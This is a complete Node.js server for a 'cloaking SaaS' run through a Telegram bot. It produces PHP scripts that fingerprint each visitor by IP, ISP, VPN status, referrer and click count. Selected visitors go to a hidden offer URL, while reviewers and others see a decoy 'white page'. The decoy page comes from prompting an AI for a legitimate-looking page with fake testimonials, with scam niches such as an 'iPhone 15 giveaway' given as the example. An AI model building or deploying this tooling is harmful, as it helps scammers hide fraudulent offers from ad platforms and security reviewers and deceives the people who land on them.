// server.js – Full Cloaking SaaS with Advanced Detection + Fixed Download
require('dotenv').config();
const express = require('express');
const session = require('express-session');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const axios = require('axios');
const { Telegraf, Markup } = require('telegraf');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

// ---------- Database Setup ----------
const db = new sqlite3.Database(path.join(__dirname, 'cloaking.db'));

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        password TEXT,
        telegram_id TEXT UNIQUE,
        plan TEXT DEFAULT 'free',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS campaigns (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        name TEXT,
        offer_url TEXT,
        white_niche TEXT,
        white_html TEXT,
        clicks_per_ip INTEGER DEFAULT 15,
        clicks_per_day INTEGER DEFAULT 5,
        block_vpn INTEGER DEFAULT 0,
        block_ipv6 INTEGER DEFAULT 0,
        block_no_isp INTEGER DEFAULT 0,
        block_no_referrer INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS stats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        campaign_id TEXT,
        ip TEXT,
        user_agent TEXT,
        decision TEXT,
        country TEXT,
        isp TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        referrer TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS temp_sessions (
        telegram_id TEXT PRIMARY KEY,
        step TEXT,
        data TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// ---------- Express App ----------
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({ secret: process.env.SESSION_SECRET || 'default', resave: false, saveUninitialized: false }));
app.use(express.static('public'));

// ---------- Helper: AI White Page ----------
async function generateWhitePage(niche) {
    const prompt = `Generate a complete, modern, legitimate-looking HTML/CSS landing page for the niche: "${niche}". Return only the HTML code (including <html>, <head>, <body>). Use inline CSS. Make it look professional with a call to action, fake testimonials, and a convincing design.`;
    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${process.env.GEMINI_API_KEY}`;
    try {
        const response = await axios.post(url, {
            contents: [{ parts: [{ text: prompt }] }]
        });
        let html = response.data.candidates[0].content.parts[0].text;
        html = html.replace(/```html/g, '').replace(/```/g, '');
        return html;
    } catch (err) {
        console.error('AI error:', err.message);
        return '<html><body><h1>White Page</h1><p>AI unavailable, using fallback.</p></body></html>';
    }
}

// ---------- Helper: Generate index.php (Advanced Detection) ----------
function generateIndexPHP(campaign) {
    const { id, offer_url, white_html, clicks_per_ip, clicks_per_day,
            block_vpn, block_ipv6, block_no_isp, block_no_referrer } = campaign;
    
    // Escape for PHP string
    const escapedHtml = white_html.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
    
    return `<?php
// ========== ADVANCED CLOAKING SCRIPT ==========
// Campaign ID: ${id}
// Offer URL: ${offer_url}
// Rate limits: ${clicks_per_ip || 15} clicks per IP (lifetime), ${clicks_per_day || 5} per day

$api_url = "https://${process.env.DOMAIN || 'yourdomain.com'}/api/track";
$campaign_id = "${id}";
$offer_url = "${offer_url}";
$clicks_per_ip_limit = ${clicks_per_ip ?? 15};
$clicks_per_day_limit = ${clicks_per_day ?? 5};
$block_vpn = ${block_vpn ? 1 : 0};
$block_ipv6 = ${block_ipv6 ? 1 : 0};
$block_no_isp = ${block_no_isp ? 1 : 0};
$block_no_referrer = ${block_no_referrer ? 1 : 0};

// White page HTML
$white_html = '${escapedHtml}';

// ---------- Helper Functions ----------
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

function getISPandLocation($ip) {
    $url = "http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,proxy";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response) {
        $data = json_decode($response, true);
        if ($data && $data['status'] == 'success') {
            return [
                'country' => $data['country'],
                'region' => $data['regionName'],
                'city' => $data['city'],
                'isp' => $data['isp'],
                'is_proxy' => $data['proxy'] ?? false
            ];
        }
    }
    return ['country' => 'Unknown', 'isp' => 'Unknown', 'is_proxy' => false];
}

function getDeviceInfo($user_agent) {
    $device = 'Unknown';
    $os = 'Unknown';
    $browser = 'Unknown';
    if (preg_match('/iPhone|iPad|iPod/i', $user_agent)) $device = 'iOS';
    elseif (preg_match('/Android/i', $user_agent)) $device = 'Android';
    elseif (preg_match('/Windows Phone/i', $user_agent)) $device = 'Windows Phone';
    elseif (preg_match('/Windows/i', $user_agent)) $device = 'Windows';
    elseif (preg_match('/Mac/i', $user_agent)) $device = 'Mac';
    elseif (preg_match('/Linux/i', $user_agent)) $device = 'Linux';
    
    if (preg_match('/Windows NT 10.0/i', $user_agent)) $os = 'Windows 10';
    elseif (preg_match('/Windows NT 6.1/i', $user_agent)) $os = 'Windows 7';
    elseif (preg_match('/Mac OS X (\\d+[._]\\d+)/i', $user_agent, $m)) $os = 'macOS ' . str_replace('_', '.', $m[1]);
    elseif (preg_match('/Android (\\d+\\.\\d+)/i', $user_agent, $m)) $os = 'Android ' . $m[1];
    elseif (preg_match('/iPhone OS (\\d+[._]\\d+)/i', $user_agent, $m)) $os = 'iOS ' . str_replace('_', '.', $m[1]);
    
    if (preg_match('/Edg/i', $user_agent)) $browser = 'Edge';
    elseif (preg_match('/Chrome/i', $user_agent)) $browser = 'Chrome';
    elseif (preg_match('/Firefox/i', $user_agent)) $browser = 'Firefox';
    elseif (preg_match('/Safari/i', $user_agent)) $browser = 'Safari';
    elseif (preg_match('/Opera/i', $user_agent)) $browser = 'Opera';
    
    return ['device' => $device, 'os' => $os, 'browser' => $browser];
}

function getClickCount($ip, $campaign_id) {
    $data_file = sys_get_temp_dir() . "/cloak_{$campaign_id}_{$ip}.json";
    if (file_exists($data_file)) {
        $data = json_decode(file_get_contents($data_file), true);
        if ($data) return $data;
    }
    return ['total' => 0, 'today' => 0, 'last_date' => date('Y-m-d')];
}

function updateClickCount($ip, $campaign_id) {
    $data = getClickCount($ip, $campaign_id);
    $today = date('Y-m-d');
    if ($data['last_date'] != $today) {
        $data['today'] = 0;
        $data['last_date'] = $today;
    }
    $data['total']++;
    $data['today']++;
    file_put_contents(sys_get_temp_dir() . "/cloak_{$campaign_id}_{$ip}.json", json_encode($data));
    return $data;
}

// ---------- Main Detection Logic ----------
$ip = getUserIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referrer = $_SERVER['HTTP_REFERER'] ?? '';

$ip_info = getISPandLocation($ip);
$device_info = getDeviceInfo($user_agent);

$click_data = getClickCount($ip, $campaign_id);
$exceeded_total = $click_data['total'] >= $clicks_per_ip_limit;
$exceeded_today = $click_data['today'] >= $clicks_per_day_limit;

$is_vpn = $ip_info['is_proxy'] || ($block_vpn && strpos(strtolower($ip_info['isp']), 'vpn') !== false);
$is_ipv6 = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
$has_isp = ($ip_info['isp'] != 'Unknown');
$has_referrer = !empty($referrer);

$show_offer = true;
if ($exceeded_total || $exceeded_today) $show_offer = false;
if ($block_vpn && $is_vpn) $show_offer = false;
if ($block_ipv6 && $is_ipv6) $show_offer = false;
if ($block_no_isp && !$has_isp) $show_offer = false;
if ($block_no_referrer && !$has_referrer) $show_offer = false;

if ($show_offer) {
    updateClickCount($ip, $campaign_id);
}

$track_data = [
    'campaign_id' => $campaign_id,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'decision' => $show_offer ? 'main' : 'white',
    'country' => $ip_info['country'],
    'isp' => $ip_info['isp'],
    'device' => $device_info['device'],
    'os' => $device_info['os'],
    'browser' => $device_info['browser'],
    'referrer' => $referrer
];
$ch = curl_init($api_url);
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($track_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 2);
curl_exec($ch);
curl_close($ch);

if ($show_offer) {
    header("Location: $offer_url");
    exit;
} else {
    echo $white_html;
}
?>`;
}

// ---------- Auth Middleware ----------
const auth = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token && !req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
    if (token) {
        try {
            const decoded = jwt.verify(token, process.env.JWT_SECRET || 'default');
            req.userId = decoded.id;
        } catch(e) { return res.status(401).json({ error: 'Invalid token' }); }
    } else {
        req.userId = req.session.userId;
    }
    next();
};

// ---------- API Routes ----------
app.post('/api/register', async (req, res) => {
    const { email, password, telegram_id } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
    const hashed = await bcrypt.hash(password, 10);
    db.run(`INSERT INTO users (email, password, telegram_id) VALUES (?, ?, ?)`, [email, hashed, telegram_id || null], function(err) {
        if (err) return res.status(400).json({ error: 'Email/Telegram exists' });
        res.json({ success: true });
    });
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    db.get(`SELECT * FROM users WHERE email = ?`, [email], async (err, user) => {
        if (!user || !(await bcrypt.compare(password, user.password))) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        const token = jwt.sign({ id: user.id, email: user.email }, process.env.JWT_SECRET || 'default');
        req.session.userId = user.id;
        res.json({ token, user: { id: user.id, email: user.email, telegram_id: user.telegram_id } });
    });
});

app.post('/api/campaigns', auth, async (req, res) => {
    const { name, offer_url, white_niche, clicks_per_ip, clicks_per_day, block_vpn, block_ipv6, block_no_isp, block_no_referrer } = req.body;
    if (!name || !offer_url || !white_niche) return res.status(400).json({ error: 'Missing fields' });
    const id = crypto.randomUUID();
    const whiteHtml = await generateWhitePage(white_niche);
    db.run(`INSERT INTO campaigns (id, user_id, name, offer_url, white_niche, white_html, clicks_per_ip, clicks_per_day, block_vpn, block_ipv6, block_no_isp, block_no_referrer)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [id, req.userId, name, offer_url, white_niche, whiteHtml, clicks_per_ip || 15, clicks_per_day || 5,
             block_vpn ? 1 : 0, block_ipv6 ? 1 : 0, block_no_isp ? 1 : 0, block_no_referrer ? 1 : 0], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true, id });
    });
});

app.get('/api/campaigns', auth, (req, res) => {
    db.all(`SELECT id, name, offer_url, white_niche, created_at FROM campaigns WHERE user_id = ?`, [req.userId], (err, rows) => {
        res.json(rows || []);
    });
});

app.get('/api/campaigns/:id/stats', auth, (req, res) => {
    const campaignId = req.params.id;
    db.get(`SELECT COUNT(CASE WHEN decision='main' THEN 1 END) as main, COUNT(CASE WHEN decision='white' THEN 1 END) as white FROM stats WHERE campaign_id = ?`, [campaignId], (err, row) => {
        res.json(row || { main: 0, white: 0 });
    });
});

app.get('/api/campaigns/:id/download', auth, (req, res) => {
    const campaignId = req.params.id;
    db.get(`SELECT * FROM campaigns WHERE id = ? AND user_id = ?`, [campaignId, req.userId], (err, campaign) => {
        if (!campaign) return res.status(404).json({ error: 'Not found' });
        const phpCode = generateIndexPHP(campaign);
        res.setHeader('Content-Disposition', `attachment; filename="cloak_${campaignId}.php"`);
        res.setHeader('Content-Type', 'application/x-httpd-php');
        res.send(phpCode);
    });
});

app.post('/api/track', (req, res) => {
    const { campaign_id, ip, user_agent, decision, country, isp, device, os, browser, referrer } = req.body;
    db.run(`INSERT INTO stats (campaign_id, ip, user_agent, decision, country, isp, device, os, browser, referrer)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [campaign_id, ip, user_agent, decision, country, isp, device, os, browser, referrer], (err) => {
        res.json({ ok: true });
    });
});

// ---------- Telegram Bot ----------
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

// Helper functions for bot
async function getTempSession(telegramId) {
    return new Promise((resolve) => {
        db.get(`SELECT step, data FROM temp_sessions WHERE telegram_id = ?`, [telegramId], (err, row) => {
            if (row) resolve({ step: row.step, data: row.data ? JSON.parse(row.data) : {} });
            else resolve({ step: null, data: {} });
        });
    });
}
async function setTempSession(telegramId, step, data = {}) {
    db.run(`INSERT OR REPLACE INTO temp_sessions (telegram_id, step, data) VALUES (?, ?, ?)`, [telegramId, step, JSON.stringify(data)]);
}
async function clearTempSession(telegramId) {
    db.run(`DELETE FROM temp_sessions WHERE telegram_id = ?`, [telegramId]);
}
async function getUserIdByTelegram(telegramId) {
    return new Promise((resolve) => {
        db.get(`SELECT id FROM users WHERE telegram_id = ?`, [telegramId], (err, row) => resolve(row ? row.id : null));
    });
}
async function createUser(email, password, telegramId) {
    const hashed = await bcrypt.hash(password, 10);
    return new Promise((resolve, reject) => {
        db.run(`INSERT INTO users (email, password, telegram_id) VALUES (?, ?, ?)`, [email, hashed, telegramId], function(err) {
            if (err) reject(err);
            else resolve(this.lastID);
        });
    });
}

// Command: /download <campaign_id>
bot.command('download', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('Usage: /download <campaign_id>\n\nExample: /download b103f26f-3918-4fd3-9b59-ba34b8f366f0');
    }
    const campaignId = args[1];
    const telegramId = ctx.from.id;
    const userId = await getUserIdByTelegram(telegramId);
    if (!userId) return ctx.reply('❌ Your Telegram is not linked. Use /start to register/link.');
    
    db.get(`SELECT * FROM campaigns WHERE id = ? AND user_id = ?`, [campaignId, userId], (err, campaign) => {
        if (err || !campaign) return ctx.reply('❌ Campaign not found or you don\'t own it.');
        const phpCode = generateIndexPHP(campaign);
        const buffer = Buffer.from(phpCode, 'utf-8');
        ctx.replyWithDocument({ source: buffer, filename: `cloak_${campaignId}.php` });
    });
});

// Start command
bot.start(async (ctx) => {
    const telegramId = ctx.from.id;
    const userId = await getUserIdByTelegram(telegramId);
    if (!userId) {
        await ctx.reply(
            '🔐 *Welcome to Cloaking Bot*\n\nYou need an account to continue.\nChoose an option:',
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📝 Register New Account', 'register_new')],
                    [Markup.button.callback('🔗 Link Existing Account', 'link_existing')]
                ])
            }
        );
    } else {
        await ctx.reply(`Welcome back! Use buttons below:`, Markup.inlineKeyboard([
            [Markup.button.callback('📋 My Campaigns', 'list_campaigns')],
            [Markup.button.callback('➕ New Campaign', 'new_campaign')],
            [Markup.button.callback('📊 Stats', 'stats_menu')],
            [Markup.button.callback('⬇️ Download Script', 'download_menu')]
        ]));
    }
});

// Register and link actions
bot.action('register_new', async (ctx) => {
    await ctx.answerCbQuery();
    setTempSession(ctx.from.id, 'reg_email', {});
    await ctx.reply('📧 Send your email address:');
});
bot.action('link_existing', async (ctx) => {
    await ctx.answerCbQuery();
    setTempSession(ctx.from.id, 'link_email', {});
    await ctx.reply('🔗 Send the email address of your existing account:');
});

// Text handler for registration/linking and campaign creation
bot.on('text', async (ctx) => {
    const telegramId = ctx.from.id;
    const sessionData = await getTempSession(telegramId);
    const text = ctx.message.text.trim();

    // Registration steps
    if (sessionData.step === 'reg_email') {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(text)) return ctx.reply('❌ Invalid email. Send again:');
        sessionData.data.email = text;
        setTempSession(telegramId, 'reg_password', sessionData.data);
        return ctx.reply('🔒 Send a password (min 6 characters):');
    }
    if (sessionData.step === 'reg_password') {
        if (text.length < 6) return ctx.reply('❌ Password must be at least 6 characters. Send again:');
        sessionData.data.password = text;
        setTempSession(telegramId, 'reg_confirm', sessionData.data);
        return ctx.reply('🔁 Confirm password (type again):');
    }
    if (sessionData.step === 'reg_confirm') {
        if (text !== sessionData.data.password) return ctx.reply('❌ Passwords do not match. Start over with /start');
        try {
            await createUser(sessionData.data.email, sessionData.data.password, telegramId);
            await ctx.reply('✅ Registration successful! You can now use the bot.\nPress /start to continue.');
            clearTempSession(telegramId);
        } catch (err) {
            if (err.message.includes('UNIQUE')) {
                ctx.reply('❌ Email already registered. Use /start and choose "Link Existing Account" or a different email.');
            } else {
                ctx.reply('❌ Error creating account. Try again later.');
            }
            clearTempSession(telegramId);
        }
        return;
    }
    // Link existing account
    if (sessionData.step === 'link_email') {
        const email = text;
        db.get(`SELECT id FROM users WHERE email = ?`, [email], async (err, user) => {
            if (!user) {
                await ctx.reply('❌ No account found with that email. Register first using /start');
                clearTempSession(telegramId);
                return;
            }
            db.run(`UPDATE users SET telegram_id = ? WHERE id = ?`, [telegramId, user.id], (err) => {
                if (err) ctx.reply('Error linking. Try again.');
                else {
                    ctx.reply('✅ Account linked! Now use /start');
                    clearTempSession(telegramId);
                }
            });
        });
        return;
    }
    // New campaign conversation
    if (sessionData.step === 'new_campaign_name') {
        sessionData.data.name = text;
        setTempSession(telegramId, 'new_campaign_offer', sessionData.data);
        return ctx.reply('Send offer URL (where real visitors go):');
    }
    if (sessionData.step === 'new_campaign_offer') {
        sessionData.data.offer_url = text;
        setTempSession(telegramId, 'new_campaign_niche', sessionData.data);
        return ctx.reply('Send niche for AI white page (e.g., "iPhone 15 giveaway"):');
    }
    if (sessionData.step === 'new_campaign_niche') {
        sessionData.data.white_niche = text;
        const userId = await getUserIdByTelegram(telegramId);
        if (!userId) return ctx.reply('Not linked. Please /start');
        await ctx.reply('Generating white page with AI... ⏳');
        const whiteHtml = await generateWhitePage(sessionData.data.white_niche);
        const campaignId = crypto.randomUUID();
        db.run(`INSERT INTO campaigns (id, user_id, name, offer_url, white_niche, white_html)
                VALUES (?, ?, ?, ?, ?, ?)`,
                [campaignId, userId, sessionData.data.name, sessionData.data.offer_url, sessionData.data.white_niche, whiteHtml], async (err) => {
            if (err) {
                await ctx.reply('Error creating campaign.');
            } else {
                await ctx.reply(`✅ Campaign created!\n\nName: ${sessionData.data.name}\nID: ${campaignId}\nUse /download ${campaignId} to get index.php`);
            }
            clearTempSession(telegramId);
        });
        return;
    }
});

// Action handlers for campaigns
bot.action('list_campaigns', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = await getUserIdByTelegram(ctx.from.id);
    if (!userId) return ctx.reply('Not linked. Please /start');
    db.all(`SELECT id, name, offer_url FROM campaigns WHERE user_id = ?`, [userId], (err, rows) => {
        if (!rows || rows.length === 0) return ctx.reply('No campaigns found. Create one with /start → New Campaign');
        let msg = '📋 *Your Campaigns:*\n';
        rows.forEach(c => {
            msg += `\n🔹 *${c.name}*\n   ID: \`${c.id}\`\n   Offer: ${c.offer_url}\n`;
        });
        ctx.reply(msg, { parse_mode: 'Markdown' });
    });
});
bot.action('new_campaign', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = await getUserIdByTelegram(ctx.from.id);
    if (!userId) return ctx.reply('Not linked. Please /start');
    setTempSession(ctx.from.id, 'new_campaign_name', {});
    await ctx.reply('Send campaign name:');
});
bot.action('stats_menu', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = await getUserIdByTelegram(ctx.from.id);
    if (!userId) return ctx.reply('Not linked. Please /start');
    db.all(`SELECT id, name FROM campaigns WHERE user_id = ?`, [userId], (err, rows) => {
        if (!rows || rows.length === 0) return ctx.reply('No campaigns.');
        const buttons = rows.map(c => [Markup.button.callback(c.name, `stats_${c.id}`)]);
        ctx.reply('Select campaign to see stats:', Markup.inlineKeyboard(buttons));
    });
});
bot.action(/stats_(.+)/, async (ctx) => {
    const campaignId = ctx.match[1];
    await ctx.answerCbQuery();
    db.get(`SELECT COUNT(CASE WHEN decision='main' THEN 1 END) as main, COUNT(CASE WHEN decision='white' THEN 1 END) as white FROM stats WHERE campaign_id = ?`, [campaignId], (err, row) => {
        const main = row?.main || 0;
        const white = row?.white || 0;
        ctx.reply(`📊 Stats for campaign \`${campaignId}\`:\n✅ Main clicks: ${main}\n❌ White page views: ${white}`, { parse_mode: 'Markdown' });
    });
});
bot.action('download_menu', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = await getUserIdByTelegram(ctx.from.id);
    if (!userId) return ctx.reply('Not linked. Please /start');
    db.all(`SELECT id, name FROM campaigns WHERE user_id = ?`, [userId], (err, rows) => {
        if (!rows || rows.length === 0) return ctx.reply('No campaigns.');
        const buttons = rows.map(c => [Markup.button.callback(c.name, `download_${c.id}`)]);
        ctx.reply('Select campaign to download index.php:', Markup.inlineKeyboard(buttons));
    });
});
bot.action(/download_(.+)/, async (ctx) => {
    const campaignId = ctx.match[1];
    await ctx.answerCbQuery();
    const userId = await getUserIdByTelegram(ctx.from.id);
    db.get(`SELECT * FROM campaigns WHERE id = ? AND user_id = ?`, [campaignId, userId], (err, campaign) => {
        if (!campaign) return ctx.reply('Campaign not found.');
        const phpCode = generateIndexPHP(campaign);
        const buffer = Buffer.from(phpCode, 'utf-8');
        ctx.replyWithDocument({ source: buffer, filename: `cloak_${campaignId}.php` });
    });
});

// Webhook setup
const WEBHOOK_PATH = '/telegram-webhook';
const WEBHOOK_URL = `${process.env.RENDER_EXTERNAL_URL || process.env.DOMAIN || 'https://yourdomain.com'}${WEBHOOK_PATH}`;
bot.telegram.setWebhook(WEBHOOK_URL).catch(err => console.error('Webhook error:', err));
app.use(bot.webhookCallback(WEBHOOK_PATH));

// ---------- Frontend ----------
app.get('/', (req, res) => res.send('<h1>Cloaking SaaS API is running</h1><p>Use Telegram bot @' + (process.env.TELEGRAM_BOT_TOKEN?.split(':')[0] || 'your_bot') + '</p>'));

// ---------- Start Server ----------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
